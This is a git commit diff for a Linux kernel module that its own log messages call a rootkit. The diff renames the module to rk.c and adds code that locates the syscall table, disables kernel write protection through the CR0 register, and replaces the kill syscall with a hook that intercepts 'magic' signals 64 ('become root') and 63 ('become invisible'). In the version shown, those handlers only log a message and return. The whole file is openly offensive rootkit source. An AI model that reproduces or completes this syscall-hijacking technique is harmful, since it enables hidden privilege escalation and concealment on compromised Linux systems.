3fa07c3bd99e2bf92b9b4b72d8e1bf8289fe7faa
nazar12314 <kononenkonazar47@gmail.com>
2023-09-30 13:21:29 +0300

    added hooking for kill syscall

--- Makefile
+++ Makefile
@@ -1,4 +1,4 @@
-obj-m += mymodule.o
+obj-m += rk.o
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
--- rk.c
+++ rk.c
@@ -1,15 +1,26 @@
+/*
+ Works for kernel versions >= (4,17,0)
+ */
+
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/version.h>
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
-#include <linux/utsname.h>
+#include <linux/dirent.h>
+
 
 // Syscall table address pointer
-unsigned long *sys_call_table_addr;
+unsigned long *__sys_call_table_addr;
+
+enum signals {
+    SIGSUPER = 64, // Become root
+    SIGINVIS = 63, // Become invisible
+};
 
 
+// Using kprobes method for getting syscall table address for new versions of kernel
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 
 #include <linux/kprobes.h>
@@ -22,29 +33,78 @@ static struct kprobe kp = {
 
 #endif
 
-
+// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
 #ifdef CONFIG_X86
 
 #include <asm/paravirt.h>
+#define PTREGS_MODIF
 
-extern unsigned long __force_order;
+// For new versions of kernel ptregs_t type serves as a syscall wrapepr
+typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
+static syscall_wrapper orig_kill;
 
-static inline void write_forced_cr0(unsigned long value) {
+static inline void write_forced_cr0(unsigned long value)
+{
+    unsigned long __force_order;
+
     asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
 }
 
 static void unprotect_memory(void)
 {
     write_forced_cr0(read_cr0() & ~0x10000);
+    pr_info("Unprotected memory\n");
 }
 
 static void protect_memory(void)
 {
     write_forced_cr0(read_cr0() | 0x10000);
+    pr_info("Protected memory\n");
 }
 
 #endif
 
+// Modified syscalls
+#ifdef PTREGS_MODIF
+
+static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
+{
+    int sig = regs->si;
+
+    if (sig == SIGSUPER) {
+        printk("Signal 64 was intercepted | became root");
+        return 0;
+    } else if (sig == SIGINVIS) {
+        printk("Signal 63 was intercepted | became invisible");
+        return 0;
+    }
+
+    return orig_kill(regs);
+}
+
+#endif
+
+
+static void store(void)
+{
+    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
+}
+
+
+static void hook(void)
+{
+    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
+}
+
+
+static void restore_syscall(void)
+{
+    /* Restore syscall table */
+    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
+}
+
+
+// Function that launches when module is inserted
 static int __init mod_init(void)
 {
     pr_info("rootkit: started\n");
@@ -65,20 +125,26 @@ static int __init mod_init(void)
     unregister_kprobe(&kp);
 
 #endif
-    sys_call_table_addr = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    __sys_call_table_addr = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 
-    struct new_utsname *uts;
-    uts = utsname();
+    store();
+    unprotect_memory();
 
-    printk(KERN_INFO "System architecture: %s\n", uts->machine);
+    hook();
+    protect_memory();
 
     return 0;
 }
 
 
+// Function that launches when module is released
 static void __exit mod_exit(void)
 {
     pr_info("rootkit: exited\n");
+
+    unprotect_memory();
+    restore_syscall();
+    protect_memory();
 }
 
 
